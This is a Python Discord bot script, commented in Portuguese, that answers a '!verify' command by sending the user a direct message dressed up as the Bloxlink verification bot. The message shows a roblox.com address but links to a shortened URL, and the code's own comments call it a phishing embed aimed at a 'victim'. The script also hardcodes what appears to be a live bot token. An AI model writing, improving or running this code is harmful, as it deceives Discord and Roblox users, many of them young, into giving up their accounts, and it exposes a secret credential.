import discord
from discord.ext import commands
import datetime

# --- CONFIGURAÇÃO ---
# Coloca aqui o teu token real do Developer Portal
TOKEN = 'MTQ0MjE2NDc4Mzc2MjkwMzI2MQ.GzT8q3.5pU8FsXA6VVCvP062UKGQy7bqTshh_O1LrGLdY' 

# Configuração de permissões (Intents)
# IMPORTANTE: No Developer Portal, ativa os 3 "Privileged Gateway Intents"
intents = discord.Intents.default()
intents.members = True          # Para detetar entrada de membros
intents.message_content = True  # Para o bot ler o comando !verify

client = commands.Bot(command_prefix='!', intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    print(f'✅ Logged in as {client.user}')
    print('✅ Bot is ready and listening for !verify')

@client.command()
async def verify(ctx):
    author = ctx.message.author

    # 1. Criar o Embed de Phishing (O que a vítima recebe na DM)
    test_e = discord.Embed(colour=discord.Colour(0xff6464))
    test_e.set_author(name="You must be new!")
    
    # O teu link mascarado com o encurtador do governo (h7.cl)
    test_e.add_field(
        name="Please verify your account with Bloxlink for verify!",
        value="[https://www.roblox.com/verify](https://h7.cl/1hemo)",
        inline=False
    )
    
    # Estética oficial do Bloxlink
    test_e.set_footer(
        icon_url="https://cdn.discordapp.com/avatars/865378528887308318/78776d34d943cc8c1501ae365f017c1c.png?size=128",
        text="Bloxlink"
    )
    test_e.set_image(
        url="https://images-ext-2.discordapp.net/external/KHgnlQrg5kVthDcnpe1wcYzkYplbF_e1WQwlQS58XbY/https/t2.rbxcdn.com/73def03f458ec62be70418f8e9a35da5?width=400&height=225"
    )
    test_e.timestamp = datetime.datetime.utcnow()

    # 2. Criar a mensagem pública de confirmação
    draw = discord.Embed(colour=discord.Colour(0xff6464))
    draw.add_field(
        name="Verification", 
        value=f'I have sent you a link to verify in your direct messages {ctx.author.mention}',
        inline=False
    )

    # Enviar as mensagens
    try:
        await author.send(embed=test_e) # Tenta enviar para a DM
        await ctx.send(embed=draw)     # Confirma no canal público
    except discord.Forbidden:
        await ctx.send(f"❌ {ctx.author.mention}, não consegui enviar-te DM. Ativa as tuas mensagens diretas!")

# Lançar o Bot
client.run(TOKEN)
